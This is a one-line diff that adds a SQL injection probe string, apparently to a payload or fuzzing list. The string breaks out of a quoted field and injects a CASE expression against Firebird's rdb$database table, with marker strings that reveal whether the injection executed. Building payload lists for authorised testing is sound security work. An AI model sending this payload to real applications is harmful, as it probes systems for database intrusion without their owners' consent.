@@ -1,0 +1,1 @@
+1" and 6240=('qqpjq'||(select case 6240 when 6240 then 1 else 0 end from rdb$database)||'qzvzq')
